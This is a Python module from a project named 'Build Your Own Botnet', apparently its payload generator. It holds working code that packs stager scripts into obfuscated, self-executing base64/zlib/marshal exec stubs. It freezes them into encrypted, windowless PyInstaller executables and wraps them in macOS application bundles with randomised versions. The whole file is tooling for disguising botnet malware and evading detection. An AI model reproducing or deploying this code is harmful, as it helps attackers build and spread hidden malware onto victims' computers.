#!/usr/bin/python
# -*- coding: utf-8 -*-
'Build Your Own Botnet'

# standard library
import os
import sys
import imp
import zlib
import time
import base64
import random
import marshal
import tempfile
import subprocess

# modules
import util
import security

# globals
__Template_main  = """
if __name__ == '__main__':
    _{0} = {1}({2})
    """

__Template_plist = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleDevelopmentRegion</key>
<string>English</string>
<key>CFBundleExecutable</key>
<string>{0}</string>
<key>CFBundleGetInfoString</key>
<string>{1}</string>
<key>CFBundleIconFile</key>
<string>{2}</string>
<key>CFBundleIdentifier</key>
<string>{3}</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundleName</key>
<string>{4}</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleShortVersionString</key>
<string>{5}</string>
<key>CFBundleSignature</key>
<string>????</string>
<key>CFBundleVersion</key>
<string>{6}</string>
<key>NSAppleScriptEnabled</key>
<string>YES</string>
<key>NSMainNibFile</key>
<string>MainMenu</string>
<key>NSPrincipalClass</key>
<string>NSApplication</string>
</dict>
</plist>
"""

__Template_spec = """# -*- mode: python -*-
block_cipher = pyi_crypto.PyiBlockCipher(key={key})
a = Analysis([{basename}],
             pathex=[{path}],
             binaries=[],
             datas=[],
             hiddenimports={imports},
             hookspath=[],
             runtime_hooks=[],
             excludes=['site'],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          name={name},
          debug=False,
          strip=False,
          upx=False,
          runtime_tmpdir=None,
          console=False, icon={icon})
"""

# main
def compress(input):
    """
    Zip-compress output into self-executing script

    `Requires`
    :param str input:    input code to compress

    Returns compressed output as a string

    """
    return "import zlib,base64,marshal;exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(input, '', 'exec')), 9))))

def obfuscate(input):
    """
    Obfuscate and minimize memory footprint of output

    `Requires`
    :param str input:    input code to obfuscate

    Returns obfuscated output as a string

    """
    if os.path.isfile(input):
        input = open(input, 'r').read()
    temp = tempfile.NamedTemporaryFile(suffix='.py', delete=False)
    temp.file.write(input)
    temp.file.close()
    name = os.path.join(tempfile.gettempdir(), temp.name)
    obfs = subprocess.Popen('pyminifier -o {} --obfuscate-classes --obfuscate-variables --replacement-length=1 {}'.format(name, name), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
    obfs.wait()
    output = open(name, 'r').read().replace('# Created by pyminifier (https://github.com/liftoff/pyminifier)', '')
    os.remove(name)
    return output

def variable(length=6):
    """
    Generate a random alphanumeric variable name of given length

    `Optional`
    :param int length:    length of the variable name to generate

    Returns variable as a string

    """
    return random.choice([chr(n) for n in range(97,123)]) + str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(length)-1))

def main(function, *args, **kwargs):
    """
    Generate a simple code snippet to initialize a script

    if __name__ == "__main__":
        _function = Function(*args, **kwargs)

    `Required`
    :param str funciton:    function name

    `Optional`
    :param tuple args:      positional arguments
    :param dict kwargs:     keyword arguments

    Returns code snippet as a string

    """
    options = ', '.join(args) + str(', '.join(str("{}={}".format(k, v) if bool(v.count('{') > 0 and v.count('{') > 0) else "{}='{}'".format(k,v)) for k,v in kwargs.items()) if len(kwargs) else '')
    return __Template_main.format(function.lower(), function, options)

def freeze(filename, icon=None, hidden=None):
    """
    Compile a Python file into a standalone executable
    binary with a built-in Python interpreter

    `Required`
    :param str icon:        icon image filename
    :param str filename:    target filename

    Returns output filename as a string

    """
    basename = os.path.basename(filename)
    name = os.path.splitext(basename)[0]
    path = os.path.splitdrive(os.path.abspath('.'))[1].replace('\\','/')
    key = str().join([random.choice([chr(i) for i in range(48,91) + range(97,123)]) for _ in range(16)])
    imports = [i.strip().split()[1].split(';')[0].split(',') for i in open(filename).read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import']
    for _ in imports:
        if isinstance(_, list):
            __ = imports.pop(imports.index(_))
            for ___ in __:
                if ___ not in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + ['core.%s' % s for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
                    imports.append(___)
    imports = list(set(imports))
    if isinstance(hidden, list):
        imports.extend(hidden)
    spec = __Template_spec.format(key=repr(key), basename=repr(basename), path=repr(path), imports=imports, name=repr(name), icon=repr(icon))
    fspec = os.path.join(path, name + '.spec')
    with open(fspec, 'w') as fp:
        fp.write(spec)
    process = subprocess.Popen('{} -m PyInstaller {}'.format(sys.executable, fspec), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
    while True:
        try:
            line = process.stderr.readline().rstrip()
        except: break
        if line: util.display(line, color='reset', style='dim')
        if 'EXE' in line and 'complete' in line: break
    output = os.path.join(path, 'dist', name + str('.exe' if os.name == 'nt' else ''))
    return output

def app(filename, icon=None):
    """
    Bundle the Python stager file into a Mac OS X application

    `Required`
    :param str icon:        icon image filename
    :param str filename:    target filename

    Returns output filename as a string
    """
    version = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
    baseName = os.path.basename(filename)
    bundleName = os.path.splitext(baseName)[0]
    appPath = os.path.join(os.getcwd(), '{}.app'.format(bundleName))
    basePath = os.path.join(appPath, 'Contents')
    distPath = os.path.join(basePath, 'MacOS')
    rsrcPath = os.path.join(basePath, 'Resources')
    pkgPath = os.path.join(basePath, 'PkgInfo')
    plistPath = os.path.join(rsrcPath, 'Info.plist')
    iconPath = os.path.basename(icon) if icon else ''
    executable = os.path.join(distPath, filename)
    bundleVersion = bundleName + ' ' + version
    bundleIdentity = 'com.' + bundleName
    infoPlist = __Template_plist.format(baseName, bundleVersion, iconPath, bundleIdentity, bundleName, bundleVersion, version)
    os.makedirs(distPath)
    os.mkdir(rsrcPath)
    with open(pkgPath, "w") as fp:
        fp.write("APPL????")
    with open(plistPath, "w") as fw:
        fw.write(infoPlist)
    os.rename(filename, os.path.join(distPath, baseName))
    return appPath
